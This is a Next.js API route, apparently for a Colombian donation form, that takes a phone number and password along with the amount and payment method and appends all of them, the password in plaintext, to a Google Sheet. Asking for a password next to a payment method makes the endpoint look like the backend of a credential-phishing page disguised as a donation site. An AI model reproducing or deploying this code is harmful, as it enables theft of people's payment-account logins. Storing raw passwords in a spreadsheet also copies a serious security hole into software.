// /app/api/donaciones/route.ts

import { google } from "googleapis";
import {
  GOOGLE_PRIVATE_KEY,
  GOOGLE_CLIENT_EMAIL,
  SPREADSHEET_ID_DONACIONES,
  SHEET_NAME_DONACIONES,
} from "@/config/idSheets";

import GOOGLE_SHEETS_API_KEY from "@/config/googleApiKey";

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { phoneNumber, password, amount, selectedActivity, paymentMethod } = body;

    if (!amount || !selectedActivity || !paymentMethod) {
      return Response.json(
        { error: "Faltan datos obligatorios" },
        { status: 400 }
      );
    }

    // Autenticación con Service Account
    const auth = new google.auth.JWT(
      GOOGLE_CLIENT_EMAIL,
      undefined,
      GOOGLE_PRIVATE_KEY.replace(/\\n/g, "\n"),
      ["https://www.googleapis.com/auth/spreadsheets"]
    );

    const sheets = google.sheets({
      version: "v4",
      auth,
      params: {
        key: GOOGLE_SHEETS_API_KEY,
      },
    });

    // Datos en columnas A:F:
    // A: Fecha
    // B: Actividad
    // C: Monto
    // D: Método de pago
    // E: Número
    // F: Contraseña
    const values = [
      [
        new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" }),
        selectedActivity,
        amount,
        paymentMethod,
        phoneNumber || "N/A",
        password || "N/A",
      ],
    ];

    await sheets.spreadsheets.values.append({
      spreadsheetId: SPREADSHEET_ID_DONACIONES,
      range: `${SHEET_NAME_DONACIONES}!A:F`,
      valueInputOption: "RAW",
      requestBody: { values },
    });

    return Response.json({ message: "Donación registrada con éxito" });
  } catch (error) {
    console.error("Error al registrar donación:", error);
    return Response.json(
      { error: "Error interno al registrar la donación" },
      { status: 500 }
    );
  }
}